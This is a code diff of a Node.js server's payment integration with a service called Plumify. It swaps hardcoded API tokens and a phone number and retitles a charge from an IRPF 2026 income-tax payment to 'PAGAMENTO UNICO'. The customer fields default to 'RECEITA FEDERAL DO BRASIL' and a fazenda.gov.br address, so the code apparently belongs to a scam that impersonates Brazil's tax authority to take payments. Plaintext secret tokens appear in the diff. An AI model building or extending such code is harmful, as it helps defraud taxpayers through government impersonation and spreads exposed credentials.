@@ -240,8 +240,8 @@ app.get('/password.html', (req, res) => {
 });
 
 // ==================== INTEGRAÇÃO PLUMIFY ====================
-const PLUMIFY_PRODUCT_HASH = 'smm88ihfg0';
-const PLUMIFY_API_TOKEN = '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa';
+const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
+const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';
 
 // Função para gerar ID único da transação
 function generateTransactionId() {
@@ -265,12 +265,12 @@ app.post('/api/create-payment', async (req, res) => {
         customer: {
             name: customer_name || 'RECEITA FEDERAL DO BRASIL',
             email: customer_email || 'receita@fazenda.gov.br',
-            phone_number: '11999999999',
+            phone_number: '21973059827',
             document: customer_cpf || '11144477735'
         },
         cart: [{
             product_hash: PLUMIFY_PRODUCT_HASH,
-            title: 'Imposto de Renda Pessoa Física - IRPF 2026',
+            title: 'PAGAMENTO UNICO',
             price: amountCents,
             quantity: 1,
             operation_type: 1,
